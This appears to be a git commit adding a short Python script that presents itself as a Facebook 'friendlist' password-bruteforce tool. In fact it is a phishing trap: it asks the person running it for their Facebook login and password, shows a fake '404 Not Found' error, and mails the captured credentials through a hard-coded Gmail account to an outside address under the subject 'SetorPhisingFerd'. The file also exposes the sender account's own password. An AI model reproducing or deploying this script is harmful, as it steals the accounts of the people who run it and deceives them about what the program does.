323e4680794ec4090e6f12289419f91b1bb18866
Mr. Asrori <66507544+achmadaghni@users.noreply.github.com>
2020-06-07 16:45:27 +0700

    Add files via upload

---
+++ ferdfb.py
@@ -0,0 +1,37 @@
+# -*- coding: utf-8 -*-
+# coding=utf-8
+import socket,struct,os,sys,time,yagmail
+x=yagmail.SMTP('darkfb94@gmail.com','aamtampan')
+subject='SetorPhisingFerd'
+logo = """\033[1;94m█████████
+\033[1;94m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+\033[1;94m█\033[1;94m▼▼▼▼▼ \033[1;94m- _ --_--\033[1;94m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
+\033[1;94m█ \033[1;94m \033[1;94m_-_-- -_ --__\033[1;94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+\033[1;94m█\033[1;94m▲▲▲▲▲\033[1;94m--  - _ --\033[1;94m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;97mFerdian
+\033[1;94m█████████      \033[1;94m«°°°°°°°°°°✧°°°°°°°°°°»
+\033[1;94m ██ ██\x1b[00m"""
+
+banner = """
+\x1b[34mHack Friendlist Facebook
+\x1b[00mAutomatic cracking password with Bruteforce
+\x1b[00mPlease login with your account \x1b[91m!
+"""
+def main():
+	os.system('clear')
+	print(logo)
+	print(banner)
+	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
+	u=raw_input('\x1b[00mNoHP/Email: \x1b[33m')
+	p=raw_input('\x1b[00mPassword: \x1b[33m')
+	msg=('username: '+u+', password: '+p)
+	body=(msg)
+	print('')
+	print('\x1b[00mSorry, ERROR 404 Not Found\x1b[91m !\x1b[00m')
+	print('\x1b[33mPlease try again later ...')
+	os.system('sleep 3')
+	print('')
+	print('\x1b[00mExiting program \x1b[91m!')
+	os.system('exit')
+	x.send('Pgltffcgt@gmail.com',subject,body)
+
+main()
